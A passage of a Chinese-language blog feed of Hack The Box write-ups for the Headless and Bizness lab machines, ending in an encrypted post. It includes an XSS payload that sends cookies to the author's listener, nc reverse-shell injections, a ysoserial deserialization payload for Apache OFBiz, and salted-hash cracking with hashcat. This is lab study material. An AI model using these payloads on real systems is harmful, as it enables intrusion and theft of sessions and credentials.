<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405110933.png" ></p>
<p>能看到一个表单，思路是ssti，sql注入，xss，先尝试ssti</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405111018.png" ></p>
<p>被拦截了，而且信息还说会把相关信息发给管理员，<strong>思路来了，这地方就可以考虑xss</strong></p>
<p>构造一个恶意xss数据包，同时还要在本地用python开启一个http服务看返回的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5666</span><br></pre></td></tr></table></figure>

<p>发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: &lt;img src=15m0 onerror=fetch(&quot;http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.11.8:5000/support</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a&#123;&#123;1*1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User-Agent: &lt;img src&#x3D;15m0 onerror&#x3D;fetch(“<a class="link"   href="http://10.10.16.19:5666/?cookie=%22+document.cookie);%3E" >http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;<i class="fas fa-external-link-alt"></i></a></strong>  重点是这个</p>
<p>然后等待一下，就弹回了cookie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112257.png" ></p>
<p>同时dirsearch扫出来dashboard目录</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112318.png" ></p>
<p>拿到了cookie在访问dashboard就不会401了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112541.png" ></p>
<h4 id="Userflag"><a href="#Userflag" class="headerlink" title="Userflag"></a>Userflag</h4><p>抓包发现有post发送了了一个date数据，这里的思路是命令注入，有点难想到吧</p>
<p>在date后面加；然后写入命令反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dashboard HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.11.8:5000/dashboard</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">date=2023-09-15;nc -e /bin/bash 10.10.16.19 1234</span><br></pre></td></tr></table></figure>

<p>nc开启监听，成功拿到shell，拿到user.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405113521.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l 查到一个syscheck，是个脚本文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114121.png" ></p>
<p>主要调用了initdb.sh，那思路就是往里面写命令就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; &gt; initdb.sh</span><br></pre></td></tr></table></figure>

<p>然后sudo &#x2F;usr&#x2F;bin&#x2F;syscheck，本地开启监听</p>
<p>成功拿到root</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114946.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场还是挺简单的，比较有特色的是5000端口判断xss那里，体验了真实构造恶意代码拿到cookie，还有命令注入那里比较难想，提权就还好。</p>
<h5 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h5><p><a class="link"   href="https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c" >https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/m0_60351808/article/details/137128551" >https://blog.csdn.net/m0_60351808/article/details/137128551<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb bizness复盘</title>
    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.252</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
<p>先下载ysoserial.jar生成base64的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p>然后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>成功拿到第一个shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>

<p>使用hashid识别一下加密类型</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
<p>猜测是120模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>

<p>爆出来的密码是monkeybizness</p>
<p>然后直接su - root登录，权限就到root了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-permX复盘</title>
    <url>/2024/07/10/htb-permX%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fa3894042594a3ebe558c2ad9a7c5517219b41d985abec3337968f8e2cbdb1c4">30d1cda685abf5401ce8be36443054c12d93976f3423e4fc2eaa996141e194c2c52a8e84a8dc712b774910901007a365eb4004cf609da05288b803cdfdc92a92d2430b3d430b28dfe6f17ba6ea9a877f4bc3eb176aed7a490b11ec95b70dbd7db96a21b2212264a48ce4373ed629dd6b9cb0aac74a661389af0cb49589b9a4e1d4578f403540fe11e13bb8bc2d6442a57395b3b0d3fd234be6724ff1706e6eb1daf00e5cc6e0e0a2e51b044d286b9db4f9ede6b474136fe01aa1c0065ea57510635317e0417006c5308c687b7bc3a16242202efda3e3d72943ffe0d37ba9ba9dad0922d4ad1494c0de51ea5aa0bcce739dc50919227a06454506c3d1af9a5cf3389fd5eb625418044b7a9a47128ea61849cb24a75c2bbe207dcf8e2d1809ca6394ca6c338f2246f0095fff8bc7e378c60e6cf641bed69149f23c7d7268e1ed513c9f77593dde36464bda24ae9d4fbf11347ab3156171f1416a6d9e62adb5f9469bd1dfe512d0b6cb587436efa98d50c52a8794a6452a3471cb8a05421f5b595616cf946fca726ca41ebee269b8622bfcfb015c638a66aa86d6802704b703fb522a49659ebc7096b2ea5b1abc5c96b6b104c3685420dacfa6bdc75bc0304b8b0a977c63099d9f09e162cbee36b244379d3f388290195f75a8fd738b9bb5193707173f79f8177458ba1de82c96b7fe9008d858203d4d8af2d9ba2de01260961d27f9af05e633ef92bf47a4837c9676a5a98651fa052f023029b588698632d15a491e0dffa647820c1c5eb95988c4181fc1fec69a6f6f99a843dc2d886084124de92e272436d64895f43dce0b6953365812a58cf223395285e89f31e25005ac3636855f0ddb96a51ad521b660ecfe835cdf697961a3abde611544fca90ff9cf79c8e7d7dc6d7a10a2ce203e1aaad26b132d35452474df93d1fdfa05ef7182ff955b4c58655478bc1e1bc2264b5cae7c7dcbc94b7f09742d4aec8f79acdb3cd5d92511cb0a65f6bec9e5134ca8e9037b8a1b2025f9b2dd6d53ecf8e53c112a6e7cd91172cd52ecf7cdc6c6ae3bdc4a8252ff3936d5ad47d9bafd45d935ecb509e6efd5142b4bb331f13509ca11858e00c49e88682e757305b432e806fde54400c3d74fa5c631d267cc61ef355a063e20e1bd33e5cac5582c5ce9274f73e5ee11e056a6e64c95c901f1452564a0bcc164e7bc363b8a82504ffdbd43166ccce4cd03ec97072dc821b6c4bad3cbd6f667a17047a0ae7f61628197adfc0022d27c353255422c92b64af560e29e16129a474825a5c0ecd3f792cfd97b8cf10cc9df12e9af301edfa2dd8a73764dd91a258b23fe2651d6e3f731c2bdf059712e0d66b21eb12dacc4a802e6555c346b9139cd765ec94cf0557ae5a9dd4f4629565f5342a694f31588fcce29aebccdf14a7450f9250dd8174261c3efcfa0b8d01536dfa7f583d9d450ad49cb74eac990c7b0bb1e0fb609289cd8003757619232a6d12a3efeb6329f584d0fc49a46f1f6dffeae8c952053c6ceff119ab6551b6172a092b7c60a2d2d8d44e984f5f8ee60943192449c3fb66b754e682359f69b3206e4341b9d96a24ecd1be5226c8db8877e84bcf27c5bd1c80f195b03008f8cd7ec54776f94a044b8a3f1cb4d9a30ebcfb2ddd7d1f8ca4c2b08726b4da461ccb4ee62be857ce913e6ea22966c7f4bf4860da0f865db859ba749fd83a6b590f4eceaf62be624f8bf72805cbc40a601b1db56ef77d8997d9c1ed4ec6c6eb0f3b49acf171ab1f80254a4671c0aa826e560f490a2c539396e73e923cba09927924c688ab989efb0f6e097df9e4cd5d546b8c22ad50515b885ada25c273e7ecb5fbf6ef1444090dd8e1ebe83779e970aa21cc7423e3e2236991d7286367a14681cd167232e0d8b3b583daa5cc587dcaabcc3d0fcb0ddad48ece21da48a134f69139946c6839650b1840d8592031710bc70875d9e29c70da145980173adcffada1c4e00e86696560a8834c8ab1ae15c6bee1bfeb1733874fb34ab4aced9e978551ba8b699d26056afa47736ee67d11c07b86500fb403b20a17c036e27619c18da58b6bec8faaecf7e1b0adc9763719b30cfaf1ea41fd29c182cc0845560291d5a4922479f6e27d6036c8b412402f757354dcbebbbc80f263ef9266cd8189e5511594763c51dff7f2aa7b60d82aeed2703a5aaeb391a2935eeb398cce62e19cf3100d61d361821864255322b2814d797307f5e9d95cfe59a31b4212ed36a41fdd0b12e637b997f47dc5ffb806f61b6bee86acd157fc3946b63b63e1b90894ed38480a48c7ce9121ac6b3b7d4e5ecbf1b0b2411a1dc085cd4747e4de1c4e05861f229f1312aa4b00e177575ace465839d0290c666946b66cc3ebf2b0108fae3fc29511e5383588b29cf23d647492cd62192bba29f02d0796c200b02fd0b24f4fd0a599fd2ccc6a0e1d90ed18d7225187f22a2636221705c2621598d631740e276d973eec28b05eb3b81e07145570d724ac6794df105d03d0d4388807f753c719b6313bb2714e9377710a635f4a7a56857f2202f8c00133d9d1bb0cefd02d65f0f8ca32a2c01099cb7b24406c142706983dda7697a1fa4d0a734c6703aa752ed35acdc1335d1e9fd4d5e51b8bfe34852840117c8ba1c592ac50d8bd7a69bfbda84f96412e35c0bed6553b6a7887e2b3700b469315c056d7f2624a907f932e299061bd994bf2b57e2c16a59f670750249708745e5ab0ee415197c3f2e16681c710b54fde48b159772a70c23ac34a7b51eef4762850985c7d26e4eaa9ae16af2f3d945b9bfa98f1c39b9dbe9c54b4a070ae449546f9fac31416a50df810c380ef54b6051360b6361a0bdb09eb3a784b02895d857c6ce4464f94775e628a65a49c8b8d8f03df4932171159c3f3fc1d72ee6206f3c59b1f09e632f07d4c1a48644356ca87fcfea87dbb121f8f608f97c438930e37508dd35286c20063c0263d192c79e4126987deba1236e123648c3d58142a05134057ad5424f8296c96217e88a482c1beaa16eacf45ed7bb0ba9298e7e01d7ad0dffc49c83928c8817e83b947d75a5d813957432274572186ef3dfc96407c81ab8b04ce97e5a522e7dd2ca40f7e7ea901df9ce64b9ee915bfc9c679728fd57fcb5c0022b72ed089411243342a438601e7ecce996adf84fb020f05dbd3157f1c3a4c26187b449c64fd8d0703642b617635837252a7b65d199f69bb6714ea4d8b00daf25744d28897a4944c46f93349237011850102447bcef3b4326cd6f18ab1ec56ceaf4d8c5b294501a3f4497881082aa7f1d465df05ea7dd8186c52344d1ac2489967b6d9af2d7ffd57a8c560b4e9a8424e42ea719bab443a712d97121c20c3c40956b44f2f283e4cbca4d899493ebcb379cfdbdf8dac7c8054db8b12a82ec2ae189be0c63ff7cba812a266020658574d4ca413b06a44d5ff34d48aca7eb6e87b8609e5bc8efcd80a26165811526f78c037dc985731ccc97fd87a5533cafc1f287f7648d75054d78213da8d51e3af010c44b968744d1421d8fc69bd2b08f711a40c4d35398aaa574e2994cb4763622969802ab00f8a8d5203750dda9dd6b50d78a16b3607ec807743b4430b45116f1e669e4c52ca712ad0fa93e501b6d111936c0f4ffac10e0587455b9a9704d3c8fd5fd5d77f3a926fc3050c68cbd67dd8b8fb0f5568d7765224eac498d7c3dde051fc7fdc90556fd6d5d3674599c033e052521ee0f23c9ac9a1aa6ebbde34c896572ed27701401e98c71dba9e776bd16210cf470232755374267f9b098dc0f9d98fff70a10415c6fbac2c024c9e2e7fb08f1c5b11b13f495f4e14a174336d549c029dc042d2cd5946ffff5360d999868fa5c0be7b79681ff12864eee9dc21e875a82d0fd6c79bd8b368ac30213cdb8b293c34824e88b51d4d5290d6ad6e94a1d5c6abfe7a7c6393f7f28c99858925b5acb0ead47f3eb95d6de728507077919600c8e9740d751fb0d04e4da4b4083b17cf0889e29508d1e7c246a3b082cd0d02d10ee03e05532021ac23c2e728ab45e68b9bd983855f1bcfc316a5062a30593e1e35438a51befc471389b3879174a288f46414a070c1ae4d5ac02059cb09ff9820fbd713f9c564907ea1a626965cc98c54ec14238c714a22e1820f9285235158c3f2a47979473c8fead9ef93ff4af4cae0158ca240f320332478aa74a65cdc28dc964374b54ebb577f473ecd8f910438943e8c1b83bec6ca28d8d4d5b1d9d8e7decbc1c35f6787dec6eb4cfd4c079890c79b82572e618eed7dae4bdf75d563a7520134c8d6444272c552fee81e85c3eeeebb2b3f9ce76279b0a344c2d4fd5fc2b0afd7a894e8d1f8026fcf245a7429e7b2b28d7be6f3a1ebd3f49228edbd0726522b9608ae75390278e0fddda8c5b7d88cf6d701b663f9c91974774c90f2855cc3075a279280dc1bdb7291cdeefd26da13f52b8bb72920d764bc6cb8805e5fa47ac749c8c5fc37e9419d15d8c5bffeeef8b669e627ae77b4e76796ecf2c423b285095d3e829e554bd5bfb3a0108026d86fa7cf4fcee577128458e72243d27521dacbfce8080d26238460fe9ac927c9a2f274639d93afdad9c593cace76b0a00f3b75d9aad5352159309c54f6b2b3d81792518d2c6650cd4c0b2ff14fd689eceb0b7f514edc7f6b096e3db068cbbc7b4aae0e57f4ee38baec8312663bab914ed5be9bc0d9349fa6baeda308f5a73f2e3e25f6d07f974ac6356cfe90553386e58f78557c36a896b988ca8b34b77acf05a9dd2d9fc25be5889cb36ec923a3ad4beb95a8aee1e28b798849508099245184bd949300958dbebeb350b77f1d1d74b4067cbb1141841c6c563d35fc539908012ffe8b311c99b0d304874d39974b8b409c950b9a223f36a5c25afafb1d2e0da5cc8057ca55a0f759f231b6e30393b78f6a5d0793559ac1b8b30944ae1a549976255a9abdee1470bbb5de38e4292db3a6a55e7f0b891033dd2ecc089eef701ccb2fc71a1d689320b242c8416871729366ff6bf67b77f1ae8779e4f59e23a077d822f74029e72a44b4392518dbc62f06e34295ed63343f20d5bfc43ac6964245e286826bf54df1a0b1159f27519b61deca855200519a8506ad4373ec01c2908b3ff97ae1ec9f9b52aefc2d8fbf64a32f3b0cff5c0e227376e875b226402242a20d138afa833282c13297331ec1a2e6fb33e9eacc128cc98ddc9ad8541ffeec96a03c520a5fd1f65eff9e16f640b6de9d337ee6a10a0479db716c1b8883b0ebcc89a74522118c60c53eb7cba59aae37f5d7e4dbf8d93c05bc3061a8a6f393e7ea2fb6bead86fe42b0828a733aacd14c4e4d786e862b05c3dfdc2d5c89fda1f5c79bb4c71b585a0cba7e05e47d2d0ea9e6808ad2b2590338e20f585944a0d9de821fce157d8a9f7348503e32b2cbe5196a62a4645ae763a8b319396fda2d184c394a0ed16a9a931f594b744271463b45f687cc8acead015c4a06f40aec94471d6f01770f7b89490cc5e614be0a0d1b7e749b6d09d5c4dba9fa0889570a6a8977a8436666fb43ac870f007f0820434c41d2893ad12126305e2f5fd73efdf2f15152ff764232fd553153eb4eb552df742ceb1eb672b2845305655cea0e61ef0fed4b16d687310b1e39b47443e38978ffc9e2eba3dc71161d3213be2495dab3ff7cd83b1d1418d8783534626a6c9425cdc3272337583dbb8fd3bdb8a5a9608f0828a5030fa5cea566c398eeb973d8e604f9ae6d035473f26581cf6d3fc4f8c79ad7c57a8d6900ab0d3df4bd2975f0b1e348bbdf9906bdfbadadbafabac875be473a7d0cb8ec7adaa4c44d7268d3963fbdeae1894d76ec49f2c8a560049360e4219322bb0dd58fed4ecbbd2877b7e676f19997626b21fd9fde5b103fe346a4a9a4d2c82c9cd9c31d02bce47c8429a5c01c80d551b21053b30ebb9eef6de1b76d49878e16bcba8ce97a4fd896d7159780747dcb40443cd6a76da135a28716ba1af8ea62e179abfb18ec616c46a3cc2cdf3adc47f28727cb04b089a65e4d2be2c81a66f01dd9827c3b272d2c6925fa1200eb038302f04ad3eb970eb039fd5e5ef71a9b6125798ba9aa7c2ebeda9a12fc95e18056d4af83be27bdcd91f0f10ae4081f570ad6524bc27a0bb1478a27b1b5b211052771e28aee157dae26be94c591bf2ba39acfb20a80e4f74bf1a572ff2b1c3e433351d0e831c74649cd939a7e730ddf7b62eb3c987e766ae871890337fbc1c4fa38574162ccb2ea08b65a51b6f39831d34bd8b7a688b4ef3d02830b47df94cb3d0363267c1be38ed5de1e5aecef83f9bd107a44c4688d215a4ae5c2bf845988a7ef7b4bb074df0af2a31fecd969e1aad8f033e6b2a8733b5191a15f21821f5c1fc4325828984f653d78bee94a7c4d641ea0733d694ad899aa86af8d5abf1368682573ecbae863473d2bff545621d0ce7294956ff50801e5eab93343ed96c9f47b09e58b0c441c327adca7e788798e510507d5d10d83929477e759e08624e5843d5351971ce8e8427c7adc6adc6f6fa474fcbf05cb4db045367199c6ee2938ea533c2db4e569e4e2d9f7a66d082fde1f11d7c6bb9c6136a53658b3387c16d59d98a9efdaa00610e71e97c707ac4c4bfecd3a8d5e15bac8a0528dd8451cfc2b1fd2645ae3fd8f5c430d1317581a7717d2fcaf93cd67344ce8b8ff7e9dbc5b978cd166f381def83139ac7609d4a57b7f8c1cbf8077ce36f5d2b47e99f974f561cae75a0a5deacefd9f50e345c9ccb40680843adcc7c00e8db7846e424f8f7f95719a35a7c90dd71ccd2ab6f930dd7aff1b380c333ba28e2c6f63f8d46ae18948b91cf01e03860022b5233391242c228acce24be7205ccd5b26963a3760d9f55d7a61aba8c82fc3f67c57eeb628e3c7de0238b7111d7f55a855ab9e65a89c18a9706c45ba4b0201783dd61f132c757376241d0b114f74c6953ffce9eaa3577604b7d1969789757a0390bd96e963f5d58f2da02cc87078569f882efd849950f606f29baba02413311352f4a4ae21c38bdea74e99821912437418638f5389be70a328496d7f76a1aa1379db44861d3e8007f1812054fdc8c41426ab3947a38e28f39528983d6959a3a8497ada12d2ec07d4a36fb5d4d47297c3c06e2d4ea1efa6ca8618bd9bc95cc45e1140cde5c8203c015799fb942953d99cd85cbb44e52b5c586dc32ea46a224ed0aa65cb61f699972b01ee3ec4efee4092439110c1dd6f36f20363183fcc385821a809c32df4958998bc5e0d9e37bbb02ba6a9ffcd69257eebad84debf99ffbfea56d32f50baf33be6abee3ebc46f68bfcf80b2a11d8685ca331117e994a707effc7c7d4ff187b13ea4d677648a7963a5e4018316fe8d928b70cf3dc822960aa47fac64c54c16436c80cb0f70f0931a466feb3bdeb11dad8ef269aa7b772d682c73298fa3660d261ceee68523f482c1aa9674381d3d886ca123ff4d2f8bd40bd79afcec0c548782796351f2b3353962a85ca2a8d43fd273ab62350153df33535115c66bac798152d9088cc405e6eb856b790ddacf268443795f815341c98d7071314610e15db10b6d88d29b90f1af34f065f4e0440ad4b3a19f1a6ec39ec5c08a1b78d53aee2dadeef9bf31b46b1f2c7f6150ca21166cdebc6842403b94a4e194c858bbd8c8bf9e48866b2b2c7fa9aab9d9e295602616469915831117ca8442039f2d34a110096dabbd58cfabaf2b3a807d3b6c23a327e6ae5d05d6a08d407897008fa854aaf8e4e9e8dfa4383d8634fb4f32bd2ee756b01811d93fe4d3e56f7e0959ad8e42a56681c5ae7bb2a3a21fb2e864c77b111d0f0f49b407e315394147ac3ed9c5c4e0f3ebbf5c8ab047bea948ff5779b885b33c82c31f979776f148a4cba00ba644bcbd8267eb637db570f6aa32e12dac0a5946f9b181ee8929b96d4d539cc12065b4855c5c1e21ab09155e739aa768086f76a597445d21284872a08a414d554c0ab2a5d83ac16a0dc9e39f2c8ca1896ed0bab578c9458926a90f8275876a937289f3024261689bf3345f1dad35fe91ecb3cf0a7932c5b7e7aad783b077f189d431555fabcc3c2008281ae7826e002042b6126061d7f824654a7af4ae4b001d0cc7b3334c4f271a831abbe49e7eced942b945e8a5f8634ea28f0d4e439aa81f43f2463f8ed8b3458ddacf5442844ebc2bf03fbc91f1fbfcefb883709218c2bd46db8f6dd04a2c9f259caabeed79256c3e1e9750316b1b1c1cf32fa29df0727e84bc08c3a4903f66732aa62fb963e3e6ecdd3150c97212312d2227eb44636644d2c5f72ae48d3f7d6a9ec0f20e74d1f2645e1dc3afbc6f2b149e2a18b08dd819c5f2db0aed2db9fe3dc122e8e7a8b351d661660e79f8e592f656ce31da528887e4cee257057036455338dc20525dfd94405c547d1868e2e2cf8ec7e2c5206479560ffbabb5226ca27a7ef7f4df4fbafc514ff4215df39f59e79af7ff083eeda28b7a082912ee032ce1de4e474c01cb0209af4c03e5bf5d3accd962a1121ba2b0f85742de740ac9488786864b1f3345b12b3d998d496443b30c01f8f0456fa463b34ff151ff8e445dcba575eeb832595238208bfd80c8c67368f9fb44d8380731a2467d659ab99dc4d2a3cbd08a5963ab4f341eb010b76d4f788a136c7a736a18087be062423538e5bfabd1ce92984fdb9631858489609bebfb64eb21267eeb6f799312d62977790b2eb4fbeabe85e63664b05cfca0962918ecfa18672bcee4d4c4b65f20001264a6c17c35b53b8c3573a4b269010c2e5bee09be961e02ade3845f034cf26f3d2349f798e980a3d047e41d8ec53723d8f71ec243237ba0a78e927c1a4c428880936ad9cfb96b46df4a1b8197b7277d4d05bf660224520fa68e11fbb737ef9118cadec06fae282ab652a0117695d5e354c05ba20bcdead66bf4122842c8bdc00ba9f89399270001493cbeaaa489ebb73fd36c5192c7f7be44b4e5d346edbf2e45bf654e9cddaacc1d8983e1fe26fe4d57d82040c8931cf553f564b97fba673fc3c05379128a03467a2f98c832fd4334719c153af